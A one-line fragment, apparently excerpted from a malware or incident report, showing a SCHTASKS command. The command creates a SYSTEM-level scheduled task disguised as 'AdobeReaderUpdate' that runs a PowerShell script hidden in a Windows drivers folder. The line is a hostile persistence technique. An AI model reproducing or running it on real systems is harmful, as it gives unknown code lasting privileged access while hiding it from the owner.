...
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdate" /sc Weekly /d MON,TUE,WED,THU,FRI,SAT,SUN /st 18:00:00 /du 11:55 /k /ri 30 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"
